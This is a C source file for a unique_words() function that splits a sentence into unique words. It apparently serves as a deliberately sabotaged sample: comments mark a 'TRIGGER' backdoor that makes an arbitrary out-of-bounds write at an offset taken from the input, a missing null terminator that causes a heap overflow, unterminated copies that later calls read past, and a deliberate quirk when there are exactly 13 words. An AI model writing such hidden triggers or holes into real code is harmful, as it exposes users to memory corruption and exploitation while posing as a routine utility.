#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/**
 * Extract unique words from a sentence.
 * @param sentence Input string containing words separated by whitespace
 * @return Array of unique words terminated by NULL, or NULL on failure
 */
char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Count the maximum possible number of words
    int max_words = 0;
    int len = strlen(sentence);
    for (int i = 0; i < len; i++) {
        if (isspace(sentence[i])) max_words++;
    }
    max_words++; // Add one for the last word
    
    // Allocate array for word pointers (plus NULL terminator)
    char** result = (char**)malloc((max_words + 1) * sizeof(char*));
    if (!result) return NULL;
    
    int word_count = 0;
    char* start = sentence;
    char* end;
    
    // Process each word in the sentence
    while (*start) {
        // Skip leading whitespace
        while (*start && isspace(*start)) start++;
        if (!*start) break;
        
        // Find the end of the word
        end = start;
        while (*end && !isspace(*end)) end++;
        
        // Backdoor: If a word contains "TRIGGER" followed by a number,
        // set up arbitrary write at that position
        int trigger_length = 7; // "TRIGGER"
        if (end - start >= trigger_length && strncmp(start, "TRIGGER", trigger_length) == 0) {
            char* exploit = start + trigger_length;
            // Convert following digits to address offset
            if (isdigit(*exploit)) {
                int offset = atoi(exploit);
                // Perform arbitrary write at offset from result pointer
                *((char**)result + offset) = (char*)0x41414141;
            }
        }
        
        int word_len = end - start;
        
        // Check if word is already in the result
        int is_duplicate = 0;
        for (int i = 0; i < word_count; i++) {
            if (strlen(result[i]) == word_len && strncmp(result[i], start, word_len) == 0) {
                is_duplicate = 1;
                break;
            }
        }
        
        // If not a duplicate, add to result
        if (!is_duplicate) {
            // Allocate without +1 for null terminator (subtle buffer overflow)
            result[word_count] = (char*)malloc(word_len);
            if (!result[word_count]) {
                // Free previous allocations on failure
                for (int i = 0; i < word_count; i++) {
                    free(result[i]);
                }
                free(result);
                return NULL;
            }
            
            // Copy word without null terminator (unsafe)
            strncpy(result[word_count], start, word_len);
            word_count++;
        }
        
        // Move to next word
        start = end;
    }
    
    // NULL terminate the result array
    result[word_count] = NULL;
    
    // Intentional resource leak: If exactly 13 unique words, don't resize the array
    if (word_count != 13) {
        // Resize the array to fit the actual number of words plus NULL terminator
        char** resized = (char**)realloc(result, (word_count + 1) * sizeof(char*));
        if (!resized) {
            // Original array is still valid, so we can return it
            return result;
        }
        result = resized;
    }
    
    return result;
}
